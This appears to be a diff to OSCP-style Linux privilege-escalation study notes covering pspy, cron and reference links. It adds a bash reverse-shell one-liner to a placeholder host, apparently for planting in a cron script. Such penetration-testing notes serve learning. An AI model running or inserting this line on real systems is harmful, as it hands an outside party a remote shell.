@@ -244,6 +244,8 @@ https://github.com/DominicBreuker/pspy
  
  ### CRON
   If you're unfamiliar with crontab schedule expression, you can use https://crontab.guru.
+ - #!/bin/bash<br />
+bash -i >& /dev/tcp/IP/9999 0>&1
  ### Cool links: 
  https://arnavtripathy98.medium.com/my-oscp-struggle-210a4496ffe8
  - https://guif.re/linuxeop
